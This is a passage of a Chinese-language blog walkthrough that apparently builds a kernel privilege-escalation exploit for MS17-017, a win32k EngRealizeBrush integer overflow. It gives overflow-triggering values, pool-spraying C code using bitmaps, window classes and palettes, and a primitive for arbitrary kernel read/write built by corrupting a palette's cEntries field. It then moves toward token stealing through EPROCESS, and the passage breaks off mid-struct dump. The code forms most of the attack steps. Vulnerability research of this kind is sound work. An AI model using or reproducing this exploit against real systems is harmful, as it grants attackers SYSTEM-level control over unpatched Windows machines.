class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ENGBRUSH</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  DWORD dwUnknown00; <span class="comment">// 000 00000000 </span></span><br><span class="line">  ULONG cjSize;      <span class="comment">// 004 00000144 length of the allocation</span></span><br><span class="line">  DWORD dwUnknown08; <span class="comment">// 008 00000000 </span></span><br><span class="line">  DWORD dwUnknown0c; <span class="comment">// 0c0 00000000</span></span><br><span class="line">  DWORD cxPatRealized; <span class="comment">// 010 0000000c </span></span><br><span class="line">  SIZEL sizlBitmap;        <span class="comment">// 014 00000008 00000008 </span></span><br><span class="line">  DWORD cjScanPat; <span class="comment">// 01C 00000018 flags?</span></span><br><span class="line">  PBYTE pjBits;      <span class="comment">// 020 e13fabf8 </span></span><br><span class="line">  DWORD dwUnknown24; <span class="comment">// 024 00000000 </span></span><br><span class="line">  DWORD dwUnknown28; <span class="comment">// 028 00000000 </span></span><br><span class="line">  DWORD dwUnknown2c; <span class="comment">// 02C 00000000</span></span><br><span class="line">  DWORD dwUnknown30; <span class="comment">// 030 00000000 </span></span><br><span class="line">  DWORD dwUnknown34; <span class="comment">// 034 00000000 </span></span><br><span class="line">  DWORD dwUnknown38; <span class="comment">// 038 00000000 </span></span><br><span class="line">  DWORD iFormat; <span class="comment">// 03C 00000004 == EBRUSHOBJ:ulDCPalTime?</span></span><br><span class="line">  BYTE aj[<span class="number">4</span>];</span><br><span class="line">&#125; ENDBRUSH, *PENGBRUSH;</span><br></pre></td></tr></table></figure><p><code>EngRealizeBrush</code>函数后续代码会对<code>PALLOCMEM</code>分配的<code>ENGBRUSH</code>结构体内存进行赋值，意味着整型溢出会导致申请到<code>ENGBRUSH</code>内核缓冲区过小，在赋值时会淹没到其他内核对象</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-11.png" alt></p><p>v12是无符号整型，因此要溢出并保证能申请到内存需要使</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="number">20</span>h*a3-&gt;sizlBitmap.cx)&gt;&gt;<span class="number">3</span>)*a3-&gt;sizlBitmap.cy+<span class="number">44</span>h+<span class="number">40</span>h&gt;<span class="number">0xFFFFFFFF</span>+<span class="number">2</span></span><br></pre></td></tr></table></figure><p>以下值满足条件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sizlBitmap.cx=<span class="number">0x23</span></span><br><span class="line">sizlBitmap.cy=<span class="number">0x1d41d41</span></span><br></pre></td></tr></table></figure><p>修改<code>POC</code>代码并执行，此时溢出导致申请内存大小为0x10，实际申请了0x18个字节，这是因为其中包含8个字节<code>POOL_HEADER</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-12.png" alt></p><p>为了观察整型溢出淹没的数据内容，尝试对比<code>ENGBRUSH</code>内存赋值前后的不同，这里可以看到<code>sizlBitmap.cx</code>覆盖了下一块内存的<code>POOL_HEADER</code>,POOL_HEADER被破坏，会触发名为<code>BAD_POOL_HEADER</code> 的<code>BSOD</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-13.png" alt></p><p>继续执行代码时果然触发<code>BAD_POOL_HEADER</code>导致蓝屏，因此在构造EXP时需要绕过<code>POOL_HEADER</code>校验</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-14.png" alt></p><h4 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h4><hr><p>梳理思路，由于Windows不会对内存页尾的对象相邻的<code>POOL_HEADER</code>进行校验，因此需要利用池风水技术构造内存布局，使得<code>ENGBRUSH</code>处于某一页内存的尾部,<code>PALLOCMEM</code>函数申请的内存被转换为<code>ENGBRUSH</code>结构体，因此我们有机会构造一个越界写的<code>ENGBRUSH</code>结构体，在溢出后需要在溢出的下一块内存布局一个可以方便3环程序利用的对象，如<code>bitmap</code>对象，可以在3环使用<code>Get/SetBitmapBits</code>操作。</p><p>查看<code>bitmap</code>对象内核结构<code>SURFACE</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFACE</span></span></span><br><span class="line"><span class="class">&#123;</span>                            <span class="comment">// Win XP</span></span><br><span class="line">    BASEOBJECT BaseObject;   <span class="comment">// 0x000</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hHmgr;          <span class="comment">// 0x00</span></span><br><span class="line">    ULONG ulShareCount;    <span class="comment">// 0x04</span></span><br><span class="line">    USHORT cExclusiveLock; <span class="comment">// 0x08</span></span><br><span class="line">    USHORT BaseFlags;      <span class="comment">// 0x0a</span></span><br><span class="line">    PW32THREAD Tid;        <span class="comment">// 0x0c</span></span><br><span class="line">&#125; BASEOBJECT, *POBJ; </span><br><span class="line">    SURFOBJ    surfobj;      <span class="comment">// 0x010</span></span><br><span class="line">    &#123;</span><br><span class="line">  DHSURF dhsurf;<span class="comment">//表面的句柄，前提是该表面受设备管理0x010</span></span><br><span class="line">  HSURF  hsurf;<span class="comment">//表面的句柄0x014 </span></span><br><span class="line">  DHPDEV dhpdev;<span class="comment">//标识与指定表面关联的设备的PDEV0x018 </span></span><br><span class="line">  HDEV   hdev;<span class="comment">//GDI与此设备关联的PDEV的逻辑句柄0x01c</span></span><br><span class="line">  SIZEL  sizlBitmap;<span class="comment">//指定SIZEL结构，该结构包含曲面的宽度和高度（以像素为单位）0x020</span></span><br><span class="line">  ULONG  cjBits;<span class="comment">//指定pvBits指向的缓冲区的大小0x028 </span></span><br><span class="line">  PVOID  pvBits;<span class="comment">//如果表面是标准格式的位图，则这是指向表面像素的指针0x01c </span></span><br><span class="line">  PVOID  pvScan0;<span class="comment">//指向位图的第一条扫描线的指针0x030 </span></span><br><span class="line">  LONG   lDelta;<span class="comment">//指定在位图中向下移动一条扫描线所需的字节数0x034 </span></span><br><span class="line">  ULONG  iUniq;<span class="comment">//指定指定表面的当前状态0x038</span></span><br><span class="line">  ULONG  iBitmapFormat;<span class="comment">//指定最接近此曲面的标准格式0x03c</span></span><br><span class="line">  USHORT iType;<span class="comment">//曲面类型STYPE_BITMAP | STYPE_DEVBITMAP | STYPE_DEVICE 0x040 </span></span><br><span class="line">  USHORT fjBitmap;<span class="comment">//标志位0x042 </span></span><br><span class="line">&#125; SURFOBJ;</span><br><span class="line">    XDCOBJ *   pdcoAA;       <span class="comment">// 0x044</span></span><br><span class="line">    FLONG      flags;        <span class="comment">// 0x048</span></span><br><span class="line">    PPALETTE   ppal;         <span class="comment">// 0x04c verified, palette with kernel handle, index 13</span></span><br><span class="line">    WNDOBJ     *pWinObj;     <span class="comment">// 0x050 NtGdiEndPage-&gt;GreDeleteWnd</span></span><br><span class="line">    <span class="keyword">union</span>                    <span class="comment">// 0x054</span></span><br><span class="line">    &#123;</span><br><span class="line">        HANDLE hSecureUMPD;  <span class="comment">// if UMPD_SURFACE set</span></span><br><span class="line">        HANDLE hMirrorParent;<span class="comment">// if MIRROR_SURFACE set</span></span><br><span class="line">        HANDLE hDDSurface;   <span class="comment">// if DIRECTDRAW_SURFACE set</span></span><br><span class="line">    &#125;;</span><br><span class="line">    SIZEL      sizlDim;      <span class="comment">// 0x058</span></span><br><span class="line">    HDC        hdc;          <span class="comment">// 0x060 verified</span></span><br><span class="line">    ULONG      cRef;         <span class="comment">// 0x064</span></span><br><span class="line">    HPALETTE   hpalHint;     <span class="comment">// 0x068 </span></span><br><span class="line">    HANDLE     hDIBSection;  <span class="comment">// 0x06c for DIB sections</span></span><br><span class="line">    HANDLE     hSecure;      <span class="comment">// 0x070</span></span><br><span class="line">    DWORD      dwOffset;     <span class="comment">// 0x074</span></span><br><span class="line">    UINT       unk_078;      <span class="comment">// 0x078</span></span><br><span class="line"> <span class="comment">// ... ?</span></span><br><span class="line">&#125; SURFACE, *PSURFACE; <span class="comment">// static unsigned long SURFACE::tSize == 0x7C, sometimes 0xBC</span></span><br></pre></td></tr></table></figure><p><code>CreateBitmap</code>函数原型如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HBITMAP <span class="title">CreateBitmap</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>        nWidth,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>        nHeight,</span></span></span><br><span class="line"><span class="function"><span class="params">  UINT       nPlanes,</span></span></span><br><span class="line"><span class="function"><span class="params">  UINT       nBitCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> VOID *lpBits</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>bitmap</code>读写能力范围计算公式为：<a href="http://theevilbit.blogspot.com/2017/10/abusing-gdi-objects-bitmap-objects-size.html" target="_blank" rel="noopener">nWidth * nHeight * nBitCount / 8</a>。<code>ENGBRUSH</code>的<code>iFormat</code>淹没<code>SURFACE</code>对象的<code>sizlBitmap.cy</code>，而<code>sizlBitmap.cy</code>就是<code>CreateBitmap</code>参数中的<code>nHeight</code>，因此当<code>nHeight</code>值为1时可以使其读写范围扩大6倍</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-15.gif" alt></p><p>拥有了扩展读写能力的<code>bitmap</code>对象，发现<code>ENGBRUSH</code>溢出导致<code>bitmap</code>对象的读写能力扩展了6倍范围(<code>iFormat</code>覆盖<code>sizlBitmap.cy</code>导致)，但这仍然不能满足需求，因此需要将<code>bitmap</code>对象拆分成两个合适的对象，之后通过使用同一页内存中第一个<code>bitmap</code>的6倍读写能力修改第二个对象的读写能力来达到任意地址读写的目的(可以在其后再部署一个<code>bitmap</code>对象，扩展其读写范围，也可以部署其他对象，例如<code>PALETTE</code>)，本例实现采用<code>bitmap</code>对象结合调色板<code>PALETTE</code>对象，通过篡改当前 <code>PALETTE</code> 对象的成员域 <code>cEntries</code> 值，即可获得相对内存地址读写的能力。</p><p>PALETTE结构体如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PALETTE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    BASEOBJECT BaseObject;   <span class="comment">// 0x000</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hHmgr;          <span class="comment">// 0x00</span></span><br><span class="line">    ULONG ulShareCount;    <span class="comment">// 0x04</span></span><br><span class="line">    USHORT cExclusiveLock; <span class="comment">// 0x08</span></span><br><span class="line">    USHORT BaseFlags;      <span class="comment">// 0x0a</span></span><br><span class="line">    PW32THREAD Tid;        <span class="comment">// 0x0c</span></span><br><span class="line">&#125; BASEOBJECT, *POBJ; </span><br><span class="line"></span><br><span class="line">    FLONG           flPal;         <span class="comment">// 0x10</span></span><br><span class="line">    ULONG           cEntries;      <span class="comment">// 0x14</span></span><br><span class="line">    ULONG           ulTime;        <span class="comment">// 0x18</span></span><br><span class="line">    HDC             hdcHead;       <span class="comment">// 0x1c</span></span><br><span class="line">    HDEVPPAL        hSelected;     <span class="comment">// 0x20, </span></span><br><span class="line">    ULONG           cRefhpal;      <span class="comment">// 0x24</span></span><br><span class="line">    ULONG           cRefRegular;   <span class="comment">// 0x28</span></span><br><span class="line">    PTRANSLATE      ptransFore;    <span class="comment">// 0x2c</span></span><br><span class="line">    PTRANSLATE      ptransCurrent; <span class="comment">// 0x30</span></span><br><span class="line">    PTRANSLATE      ptransOld;     <span class="comment">// 0x34</span></span><br><span class="line">    ULONG           unk_038;       <span class="comment">// 0x38</span></span><br><span class="line">    PFN             pfnGetNearest; <span class="comment">// 0x3c</span></span><br><span class="line">    PFN             pfnGetMatch;   <span class="comment">// 0x40</span></span><br><span class="line">    ULONG           ulRGBTime;     <span class="comment">// 0x44</span></span><br><span class="line">    PRGB555XL       pRGBXlate;     <span class="comment">// 0x48</span></span><br><span class="line">    PALETTEENTRY    *pFirstColor;  <span class="comment">// 0x4c读写点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PALETTE</span> *<span class="title">ppalThis</span>;</span>     <span class="comment">// 0x50</span></span><br><span class="line">    PALETTEENTRY    apalColors[<span class="number">1</span>]; <span class="comment">// 0x54</span></span><br><span class="line">&#125; PALETTE, *PPALETTE;</span><br></pre></td></tr></table></figure><p>采用这种方式，需要先将用来占位的<code>bitmap</code>位图对象释放掉，然后分配较小的位图<code>SURFACE</code>对象，在其后再申请适当大小的<code>PALETTE</code>对象。漏洞触发前使用<code>UnregisterClassA</code>释放掉一部分用来占位的0x18字节的窗口类菜单名称字符串，以便漏洞触发时能够申请到我们希望的位置</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-16.png" alt></p><p><strong>梳理EXP构造步骤</strong></p><ul><li>第一步，内核在释放内存块时会对相邻的内存块有效性进行校验，这是构造0x18字节的溢出时产生蓝屏的原因，而内核在释放内存块时，如果内存块位于所在内存页的末尾，则不会对相邻的内存块头部结构进行校验，因此我们构造溢出时申请的0x18个字节需要保证在内存页尾才不会触发<code>BSOD</code>，<code>0x1000-0x18=0xFE8</code>,尝试喷射大量占用FE8大小的内存，使用<code>CreateBitmap</code>，而在需要分配小于0x1000字节的内存时，<code>CreateBitmap</code>分配的内存总大小为<code>SURFACE对象大小</code>+<code>位图大小</code>+<code>POOL_HEADER</code>，<code>SURFACE</code>对象的大小为 <code>0x154</code> 字节，那么所需要创建的位图大小为<code>FE8-154-8=E8C</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> HBITMAP bitmaps[<span class="number">2000</span>];</span><br><span class="line">HBITMAP bmp;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> y = <span class="number">0</span>; y &lt; <span class="number">2000</span>; y++) &#123;</span><br><span class="line">bmp = CreateBitmap(<span class="number">0x3A3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0x20</span>, <span class="literal">NULL</span>);<span class="comment">//计算公式为nWidth * nHeight * nBitCount / 8</span></span><br><span class="line">bitmaps[y] = bmp;</span><br><span class="line">&#125;<span class="comment">//此时系统会存在大量0x18字节在内存页末尾</span></span><br></pre></td></tr></table></figure><ul><li>第二步，创建大量占用0x18个字节的对象进行占位，可以使用<code>windows</code>窗口类创建<code>lpszMenuName</code>为四个字符的窗口，创建窗口类时内核会调用<code>ExAllocatePoolWithQuotaTag</code>,申请的内存大小为<code>lpszMenuName*2+2+POOL_HEADER=0x12</code>(内存对齐后为0x18)</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> strName[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WNDCLASSEXA wndClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(strName,<span class="string">"Class%d"</span>,i);<span class="comment">//这个字符串大小不能超过5</span></span><br><span class="line">wndClass.lpfnWndProc = DefWindowProc;</span><br><span class="line">wndClass.lpszClassName = strName;</span><br><span class="line">wndClass.lpszMenuName = <span class="string">"yean"</span>;</span><br><span class="line">wndClass.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEXA);</span><br><span class="line">RegisterClassExA(&amp;wndClass);</span><br><span class="line">&#125;<span class="comment">//windows窗口类占位</span></span><br></pre></td></tr></table></figure><ul><li>第三步，释放掉第一步申请的内存，为了后续对大小为0xFE8的内存再进行二次分割(第一部分扩展读写能力，第二部分实现任意读写)</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> s = <span class="number">0</span>; s &lt; <span class="number">2000</span>; s++) &#123;</span><br><span class="line">DeleteObject(bitmaps[s]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第四步，创建2000个大小0x7F8的<code>Bitmap</code>对象进行内存占位，此时内存中会出现大量的0x7F0的内存间隙</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">2000</span>; k++) &#123;</span><br><span class="line"><span class="comment">//0x1A6*0x20/8 +0x154+0x8=7F4,补齐后为7F8</span></span><br><span class="line">bmp = CreateBitmap(<span class="number">0x1A6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0x20</span>, <span class="literal">NULL</span>);</span><br><span class="line">bitmaps[k] = bmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第五步，创建2000个大小0x7F0(FE8-0x7F8)的调色板<code>Palette</code>对象进行内存占位</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HPALETTE hps;</span><br><span class="line">LOGPALETTE* lPalette;</span><br><span class="line"><span class="comment">//0x1E3*4+0x54+8=7EC,补齐后为7F0</span></span><br><span class="line">lPalette = (LOGPALETTE*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LOGPALETTE) + (<span class="number">0x1E3</span> - <span class="number">1</span>) * <span class="keyword">sizeof</span>(PALETTEENTRY));</span><br><span class="line">lPalette-&gt;palNumEntries = <span class="number">0x1E3</span>;<span class="comment">//逻辑调色板中的条目数</span></span><br><span class="line">lPalette-&gt;palVersion = <span class="number">0x0300</span>;<span class="comment">////表示与 Windows 3.0 兼容</span></span><br><span class="line"><span class="comment">// for allocations bigger than 0x98 its Gh08 for less its always 0x98 and the tag is Gla18</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">2000</span>; k++) &#123;</span><br><span class="line">hps = CreatePalette(lPalette);<span class="comment">//循环创建创建2000个逻辑调色板</span></span><br><span class="line"><span class="keyword">if</span> (!hps) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s - %d - %d\r\n"</span>, <span class="string">"CreatePalette - Failed"</span>, GetLastError(), k);</span><br><span class="line"><span class="comment">//return;</span></span><br><span class="line">&#125;</span><br><span class="line">hp[k] = hps;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第六步，释放一部分创建的0x18对象</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TCHAR strName[<span class="number">0x32</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">800</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(strName,<span class="string">"Class%d"</span>,i);</span><br><span class="line">UnregisterClassA(strName,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第七步,触发漏洞并定位目标位图对象并获取调色板成员数据，之前喷射的<code>Bitmaps</code>位图大小为0x698,而<code>ENGBRUSH</code>越界导致其大小变成了0x698*6=0x2790，可以通过查找大于0x698的位图找到溢出点</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HRESULT res;</span><br><span class="line">bits = (BYTE*)<span class="built_in">malloc</span>(<span class="number">0x6F8</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++) &#123;</span><br><span class="line">res = GetBitmapBits(bitmaps[i], <span class="number">0x6F8</span>, bits);</span><br><span class="line"><span class="keyword">if</span> (res &gt; <span class="number">0x6F8</span> - <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">hManager = bitmaps[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Manager Bitmap: %d\r\n"</span>, i);<span class="comment">//溢出点位图</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第八步,执行触发漏洞函数溢出申请<code>ENGBRUSH</code>对象，溢出导致下一个内存头部的<code>Bitmap</code>对象越界读写，随后从7F8大小的<code>Bitmap</code>对象修改7F0大小的<code>Palette</code>对象成员<code>cEntries</code>，构造出内存任意读写</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UINT cEntries = * (UINT *)(&amp;bits[<span class="number">0x698</span> + <span class="number">0x8</span> + <span class="number">0x18</span>]);<span class="comment">//1E3</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Original Current Manager XEPALOBJ-&gt;cEntries:0x%x\r\n"</span>,cEntries);</span><br><span class="line"></span><br><span class="line">* (UINT *)(&amp;bits[<span class="number">0x698</span> + <span class="number">0x8</span> + <span class="number">0x18</span>])= <span class="number">0xFFFFFFFF</span>;<span class="comment">//修改cEntries扩展读写范围</span></span><br><span class="line">SetBitmapBits(hManager,<span class="number">0x6F8</span>,bits);<span class="comment">//修改后的PALETTE写回到原内存</span></span><br></pre></td></tr></table></figure><ul><li>第九步,可以指定两个<code>Palette</code>对象，一个命名为<code>hManager</code>，另一个命名为<code>hWorker</code>，使用<code>SetPaletteEntries</code>方法操作<code>hManager</code>对象相对偏移达到修改<code>hWokrer</code>对象<code>pFirstColor</code>指向的地址的目的，使用<code>SetPaletteEntries/GetPaletteEntries</code>操作<code>hWokrer</code>实现任意读写。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(GetPaletteEntries(hp[i],<span class="number">0</span>,<span class="number">0x400</span>,(LPPALETTEENTRY)rPalette) &gt; <span class="number">0x3BB</span>)<span class="comment">//256*4=0x400</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Manager XEPALOBJ Object Handle: 0x%x\r\n"</span>,hp[i]);<span class="comment">//查找具有任意读写范围的PALETTE</span></span><br><span class="line">hpManager = hp[i];<span class="comment">//溢出lPalette句柄</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UINT tHeader = pFirstColor - <span class="number">0x1000</span>;<span class="comment">//ENGBRUSH所在页面</span></span><br><span class="line">tHeader = tHeader &amp; <span class="number">0xFFFFF000</span>;<span class="comment">//ENGBRUSH页首</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Gh15 Address: 0x%04x.\r\n"</span>,tHeader);<span class="comment">//3FE*4=1000-8</span></span><br><span class="line">SetPaletteEntries(hpManager,<span class="number">0x3FE</span>,<span class="number">1</span>,(PALETTEENTRY*)&amp;tHeader);<span class="comment">//被溢出页的下一页的pfirstcolor-&gt;ENGBRUSH页首</span></span><br></pre></td></tr></table></figure><ul><li>第十步，提权，加载<code>ntkrnlpa.exe</code>计算到全局变量<code>PsInitialSystemProcess</code>的偏移，在<code>ntkrnlpa.exe</code>中<code>PsInitialSystemProcess</code>代表了<code>EPROCESS</code>结构的地址，通过<code>EPROCESS</code>相对偏移取到双向链表<code>ActiveProcessLinks</code>的地址，通过<code>PID</code>对比找到当前进程的<code>EPROCESS</code>结构，最终从<code>ntkrnlpa.exe</code>的<code>EPROCESS</code>中取得<code>Token</code>替换到当前进程中</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt _EPROCESS</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   +<span class="number">0x098</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x0a0</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x0a8</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x0b0</span> RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +<span class="number">0x0b4</span> UniqueProcessId  : Ptr32 Void<span class="comment">//PID hear</span></span><br><span class="line">   +<span class="number">0x0b8</span> ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x0c0</span> ProcessQuotaUsage : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> ProcessQuotaPeak : [<span class="number">2</span>] 